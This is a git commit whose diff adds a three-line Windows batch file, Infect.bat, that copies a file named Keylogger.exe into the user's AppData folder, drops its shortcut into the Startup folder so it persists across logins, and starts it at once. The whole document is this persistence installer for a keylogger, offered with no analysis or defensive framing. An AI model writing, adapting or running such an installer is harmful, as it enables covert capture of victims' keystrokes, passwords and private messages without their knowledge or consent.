dc0c4455e0f96e478a83de9e5dc0a01cb1286a1b
Giaco <43766886+ContiGianfranco@users.noreply.github.com>
2022-10-22 23:20:03 -0300

    Add files via upload

---
+++ Infect.bat
@@ -0,0 +1,3 @@
+copy Keylogger.exe %appdata%
+copy Keylogger.lnk "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+start "" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Keylogger.lnk"
